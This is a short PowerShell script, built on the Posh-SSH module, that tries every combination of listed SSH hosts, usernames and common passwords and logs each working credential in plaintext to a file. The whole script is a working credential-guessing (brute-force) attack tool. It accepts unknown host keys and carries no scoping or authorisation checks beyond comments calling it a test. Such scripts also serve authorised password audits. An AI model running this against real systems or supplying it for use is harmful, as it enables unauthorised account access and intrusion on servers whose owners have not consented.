# Ensure the Posh-SSH module is loaded. This module provides SSH connectivity functions.
Import-Module Posh-SSH

# Lists of SSH hosts, usernames, and passwords to be tested.
$sshHosts = @("ssh.server1.com", "ssh.server2.com") # Array of SSH host addresses.
$usernames = @("user1", "user2") # Array of usernames to attempt login with.
$commonPasswords = @("password1", "123456") # Array of common passwords to test against each username.
$logPath = "C:\path\to\sshTestLog.log" # File path for logging the outcomes of the script.

# Function to append log messages to a specified log file, including a timestamp for each entry.
function Log-Output {
    param ($message)
    # Uses Add-Content to append the message to the log file, prepending it with the current date and time.
    Add-Content -Path $logPath -Value "$(Get-Date) - $message"
}

# Iterates over each combination of host, username, and password.
foreach ($sshHost in $sshHosts) {
    foreach ($username in $usernames) {
        foreach ($password in $commonPasswords) {
            try {
                # Attempts to establish an SSH session using provided credentials.
                # ConvertTo-SecureString is used to handle the password securely.
                $sshSession = New-SSHSession -ComputerName $sshHost -Credential (New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force))) -AcceptKey:$true -ConnectionTimeout 30

                if ($sshSession.Connected) {
                    # If the connection is successful, logs the successful authentication.
                    Log-Output "Success: Credentials for $username with password $password are valid on $sshHost."
                    # Immediately disconnects the session to clean up resources and avoid leaving connections open.
                    Remove-SSHSession -SessionId $sshSession.SessionId
                    break # Breaks out of the current loop to avoid testing more passwords for this username on this host.
                }
            } catch {
                # Catches and logs any exceptions encountered during the session creation or login attempt.
                Log-Output "Error for $username with $password on $sshHost: $_"
            }
        }
    }
}

# Cleanup step to ensure all potentially open SSH sessions are closed at the end of the script execution.
Get-SSHSession | Remove-SSHSession
